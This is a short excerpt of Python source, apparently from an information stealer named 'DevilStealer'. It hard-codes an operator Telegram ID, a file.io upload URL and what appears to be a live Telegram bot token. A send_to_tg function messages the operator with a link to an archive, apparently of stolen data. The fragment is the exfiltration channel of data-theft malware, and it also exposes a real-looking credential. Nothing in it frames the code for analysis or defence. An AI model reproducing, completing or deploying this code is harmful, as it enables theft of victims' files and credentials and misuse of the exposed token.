...
ADMIN_ID = "6365543162" # Your telegram id
FILE_IO_API_URL = "https://file.io"

bot = telebot.TeleBot("6470643463:AAGs5vFhERBokLecSZg2JspPTJFny1itYho")
...
def send_to_tg(archive_path):
    ...
    lnkkb.add(btn)
    bot.send_message(ADMIN_ID, "DevilStealer>>> Don't delete me...", reply_markup=lnkkb)
